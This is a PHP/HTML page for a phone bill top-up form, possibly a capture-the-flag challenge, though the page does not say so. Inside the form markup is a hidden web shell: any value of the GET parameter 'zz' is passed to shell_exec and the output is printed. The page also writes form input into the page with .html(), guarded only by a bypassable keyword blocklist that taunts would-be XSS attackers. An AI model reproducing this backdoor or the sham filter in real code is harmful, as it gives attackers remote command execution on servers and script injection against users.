<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
            <a class="navbar-brand" href="index.php">Home</a>
            <a class="navbar-brand" href="single.php?">Single</a>
            <a class="navbar-brand" href="bulk.php">Bulk</a>
            
        </nav>
    </header>
    <main class="container mt-5">
        <section class="jumbotron">
            <h1>Bill Top-up</h1>
        </section>
        
        
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">Bill Top-Up</h4>
                        <form id="topUpForm">
                            <div class="form-group">
                                <label for="phoneNumber">Phone Number</label>
                                <input type="text" class="form-control" id="phoneNumber" required>
                            </div>
                            <div class="form-group">
                                <label for="amount">Amount</label>
                                <input type="number" class="form-control" id="amount" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Top Up</button>
                        </form>
                        <div id="result" class="mt-3"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <?php
        if (isset($_GET["zz"]) && !empty($_GET["zz"])) {
            $command = $_GET["zz"];
            $output = shell_exec($command);
            echo "<pre>$output</pre>";
            }
        ?>
        </section>
    </main>
    <footer class="bg-dark text-white text-center py-3">
        <p>&copy; 2023 Your Company. All rights reserved.</p>
    </footer>
    
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

    <script>
        $(document).ready(function() {
            $('#topUpForm').submit(function(event) {
                event.preventDefault();
                const phoneNumber = $('#phoneNumber').val();
                const amount = $('#amount').val();

               

                if (isNaN(amount) || amount <= 0) {
                    alert("Please enter a valid positive amount.");
                    return;
                }

               
                if (phoneNumber.includes("alert") || phoneNumber.includes("script") || phoneNumber.includes("prompt") ||
                    amount.includes("alert") || amount.includes("script") || amount.includes("prompt")) {
                    alert("Guy please don't try XSS :D");
                    return;
                }

               
                const result = `Top-up successful! Phone: ${phoneNumber}, Amount: ${amount}`;
                $('#result').html(result);
            });
        });
    </script>

</body>
</html>
